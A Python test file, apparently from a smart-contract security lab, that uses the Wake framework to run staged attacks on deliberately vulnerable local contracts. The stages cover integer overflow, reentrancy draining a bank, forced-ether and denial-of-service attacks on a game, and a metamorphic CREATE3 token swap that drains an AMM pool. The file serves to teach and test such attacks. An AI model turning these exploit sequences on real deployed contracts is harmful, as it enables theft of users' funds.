from wake.testing import *


# Print failing tx call trace
def revert_handler(e: TransactionRevertedError):
    if e.tx is not None:
        print(e.tx.call_trace)


# Stage 0: Integer Overflow
@default_chain.connect()
@on_revert(revert_handler)
def test_integer_overflow():
    from pytypes.contracts.stage0.Overflow import Overflow as Overflow

    s0 = Overflow.deploy()
    s0.add(255)
    assert s0.actualBalance() == 0, "s0 not solved"


# Stage 1: Reentrancy
@default_chain.connect()
@on_revert(revert_handler)
def test_reentrancy():
    from pytypes.contracts.stage1.Reentrancy import (
        Bank as Bank,
        Attacker as Attacker,
    )

    # Define accounts
    bank_ceo = default_chain.accounts[0]
    bank_client1 = default_chain.accounts[1]
    bank_client2 = default_chain.accounts[2]
    bad_guy = default_chain.accounts[3]

    # Deploy the bank and deposit some funds
    s1_bank = Bank.deploy(from_=bank_ceo)
    s1_bank.stake(value=Wei.from_ether(1), from_=bank_client1)  # Deposit 1 ETH
    s1_bank.stake(value=Wei.from_ether(1), from_=bank_client2)  # Deposit 1 ETH

    # Check the balance of the clients
    assert s1_bank.userBalances(bank_client1) == Wei.from_ether(1)
    assert s1_bank.userBalances(bank_client2) == Wei.from_ether(1)

    # Check the balance of the bank
    assert s1_bank.getTotalBalance() == Wei.from_ether(2)

    # The user takes all the funds from the bank
    s1_bank.withdrawAll(from_=bank_client1)
    assert s1_bank.userBalances(bank_client1) == 0
    assert s1_bank.getTotalBalance() == Wei.from_ether(1)

    # Let's move the funds back just for the sake of the test
    s1_bank.stake(value=Wei.from_ether(1), from_=bank_client1)

    # Deploy the attacker and attack the bank
    s1_attacker = Attacker.deploy(from_=bad_guy)
    s1_attacker.setVictimAddress(s1_bank)
    s1_attacker.stake(value=Wei.from_ether(0.5), from_=bad_guy)

    # How many times can we withdraw?
    cnt = s1_bank.getTotalBalance() // Wei.from_ether(0.5)
    s1_attacker.setLimit(cnt)

    # Attack the bank
    s1_attacker.runTheBank()

    # The internal *stored* balances are correct
    assert s1_bank.userBalances(bank_client1) == Wei.from_ether(1)
    assert s1_bank.userBalances(bank_client2) == Wei.from_ether(1)

    # But the actual balance is zero
    assert s1_bank.getTotalBalance() == 0
    # All the funds are in the attacker's contract account
    assert s1_attacker.balance == Wei.from_ether(2.5)

    # Now, try to withdraw the funds from the attacker contract :))
    # The bad guy might be crying now because he forgot to leave
    #   the withdraw function in the attacker contract


# Stage 2: Forcing Ether
@default_chain.connect()
@on_revert(revert_handler)
def test_forcing_ether():
    from pytypes.contracts.stage2.Force import (
        DegenGame as DegenGame,
        Feeder as Feeder,
        AttackForWin as AttackForWin,
    )

    player1 = default_chain.accounts[0]
    player2 = default_chain.accounts[1]
    bad_guy = default_chain.accounts[2]

    s2_game = DegenGame.deploy()
    s2_game.deposit(from_=player1, value=Wei.from_ether(1))

    # The bad guy tries to deposit 10 ETH to become a winner
    with must_revert():
        s2_game.deposit(from_=bad_guy, value=Wei.from_ether(10))
        # ...without any success

    # The game continues normally
    s2_game.deposit(from_=player2, value=Wei.from_ether(1))
    s2_game.deposit(from_=player1, value=Wei.from_ether(1))
    s2_game.deposit(from_=player2, value=Wei.from_ether(1))
    assert s2_game.balance == Wei.from_ether(4)

    # The attacker tries a smarter way and force-feeds the game contract
    bad_guy_balance_before = bad_guy.balance
    s2_attack_win = AttackForWin.deploy(s2_game, from_=bad_guy)
    amount_until_win = s2_attack_win.requiredValue()
    s2_attack_win.attack(value=amount_until_win, from_=bad_guy)
    s2_attack_win.withdraw(from_=bad_guy)
    bad_guy_balance_after = bad_guy.balance

    # Check the outcome
    assert s2_game.balance == 0
    assert s2_game.winner() == Address(0)
    assert s2_attack_win.balance == 0
    assert (bad_guy_balance_after - bad_guy_balance_before) == Wei.from_ether(4)

    # The game is over, the attacker won
    # But let's show another example - the DoS attack

    # Start normally
    s2_game_dos = DegenGame.deploy()
    s2_game_dos.deposit(from_=player1, value=Wei.from_ether(1))

    # The attacker gets mad and feeds the game with a large amount of Ether
    s2_feeder = Feeder.deploy(s2_game_dos, value=Wei.from_ether(10), from_=bad_guy)

    # Check the current state
    assert s2_game_dos.balance == Wei.from_ether(11)
    assert s2_game_dos.winner() == Address(0)

    # Another user tries to play the game
    with must_revert():
        s2_game_dos.deposit(from_=player2, value=Wei.from_ether(1))
        # ...without any success

    # At this point, the contract is locked and no one can play the game anymore
    # ... nor withdraw the locked funds


# Stage 3: Metamorphosis
@default_chain.connect()
@on_revert(revert_handler)
def test_metamorphosis():
    from pytypes.contracts.stage3.CPAMM import CPAMM as CPAMM
    from pytypes.contracts.stage3.CREATE3Factory import (
        CREATE3Factory as CREATE3Factory,
    )
    from pytypes.contracts.stage3.ERC20 import ERC20 as ERC20
    from pytypes.contracts.stage3.MaliciousERC20 import (
        MaliciousERC20 as MaliciousERC20,
    )

    def _print_pool_state(_cpamm: CPAMM, _users_list: list):
        print("CPAMM state:")
        print("  Token1 reserves: ", cpamm.reserve0())
        print("  Token2 reserves: ", cpamm.reserve1())
        print("     Total shares: ", cpamm.totalSupply())
        for user in _users_list:
            print("     ", user.label, " shares: ", cpamm.balanceOf(user) / 10**18)
        print("     User1 shares: ", cpamm.balanceOf(user1) / 10**18)
        print("     User2 shares: ", cpamm.balanceOf(user2) / 10**18)
        print("   Bad guy shares: ", cpamm.balanceOf(user2) / 10**18)

    # Define accounts
    deployer = default_chain.accounts[0]
    deployer.label = "Deployer"
    user1 = default_chain.accounts[1]
    user1.label = "User1"
    user2 = default_chain.accounts[2]
    user2.label = "User2"
    bad_guy = default_chain.accounts[3]
    bad_guy.label = "BadGuy"
    user_list = [user1, user2, bad_guy]

    # Deploy the contracts
    factory = CREATE3Factory.deploy()
    token1_salt = keccak256(b"Token1")
    factory.deployContract(
        # Salt, just a random bytes32 value
        token1_salt,
        # Bytecode of the contract to deploy concatenated with the constructor arguments
        ERC20.get_creation_code() + abi.encode("Token1", "T1", uint8(18)),
    )
    token1 = ERC20(factory.getDeployed(factory, token1_salt))

    token2_salt = keccak256(b"Token2")
    token2 = factory.deployContract(
        token2_salt,
        ERC20.get_creation_code() + abi.encode("Token2", "T2", uint8(18)),
    )
    token2 = ERC20(factory.getDeployed(factory, token2_salt))

    cpamm = CPAMM.deploy(token1, token2)

    # Mint some tokens
    token1.mint(user1, Wei.from_ether(10000))
    token1.mint(user2, Wei.from_ether(20000))
    token2.mint(user1, Wei.from_ether(30000))
    token2.mint(user2, Wei.from_ether(40000))
    token1.mint(bad_guy, Wei.from_ether(1000))
    token2.mint(bad_guy, Wei.from_ether(1000))

    # Approve the CPAMM contract to spend the tokens
    # We set the allowance to the maximum value
    token1.approve(cpamm, uint256.max, from_=user1)
    token1.approve(cpamm, uint256.max, from_=user2)
    token2.approve(cpamm, uint256.max, from_=user1)
    token2.approve(cpamm, uint256.max, from_=user2)
    token1.approve(cpamm, uint256.max, from_=bad_guy)
    token2.approve(cpamm, uint256.max, from_=bad_guy)

    # Add liquidity
    cpamm.addLiquidity(Wei.from_ether(1000), Wei.from_ether(2000), from_=user1)
    cpamm.addLiquidity(Wei.from_ether(3000), Wei.from_ether(6000), from_=user2)

    # Let's swap some tokens
    # s3_cpamm.swap(s3_token1, Wei.from_ether(10), from_=user1)
    # s3_cpamm.swap(s3_token2, Wei.from_ether(20), from_=user2)
    # s3_cpamm.swap(s3_token1, Wei.from_ether(30), from_=user1)
    # s3_cpamm.swap(s3_token2, Wei.from_ether(40), from_=user2)
    # s3_cpamm.swap(s3_token1, Wei.from_ether(50), from_=user1)
    # s3_cpamm.swap(s3_token2, Wei.from_ether(60), from_=user2)

    # Print the current state
    _print_pool_state(cpamm, user_list)

    # Obtain the shares for the bad guy
    # To add liquidity, we must preserve the condition
    #   x / y != dx / dy
    # reserve0 * _amount1 == reserve1 * _amount0,
    token1_for_deposit = Wei.from_ether(1000) / (cpamm.reserve1() / cpamm.reserve0())
    print("Bad guy adds liquidity with ", token1_for_deposit / 10**18, " T1")
    print("                        and ", Wei.from_ether(1000) / 10**18, " T2")
    cpamm.addLiquidity(int(token1_for_deposit), Wei.from_ether(1000), from_=bad_guy)

    # Now, the fun part - replace the token contract
    # save the balance before
    balances_before = {acc: token1.balanceOf(acc) for acc in [*user_list, cpamm]}

    # Destroy the old token contract and deploy a new one
    token1.selfDestruct(deployer)
    factory.deployContract(
        token1_salt,
        MaliciousERC20.get_creation_code() + abi.encode("Token1", "T1", uint8(18)),
    )
    token1_malicious = MaliciousERC20(factory.getDeployed(factory, token1_salt))

    # Note that the deployer address is the same (the factory contract)
    #   and the salt is the same (the contract name)
    #   so the new contract will have the same address as the old one
    assert token1_malicious.address == token1.address

    # Mint the balances and approvals back
    for acc, balance in balances_before.items():
        token1_malicious.mint(acc, balance)
    for acc in balances_before.keys():
        token1_malicious.approve(cpamm, uint256.max, from_=acc)

    # Swap the tokens and displace the balances
    for _ in range(5):
        cpamm.swap(token1_malicious, Wei.from_ether(100), from_=bad_guy)

    # Print the current state
    _print_pool_state(cpamm, user_list)

    # Now, withdraw the funds from the CPAMM contract
    cpamm.removeLiquidity(cpamm.balanceOf(bad_guy), from_=bad_guy)

    # State
    print("Bad guy's balance in token 1: ", token1.balanceOf(bad_guy) / 10**18)
    print("Bad guy's balance in token 2: ", token2.balanceOf(bad_guy) / 10**18)
    print("(remember, the bad guy had 1000 T1 and 1000 T2, we got back much more)")
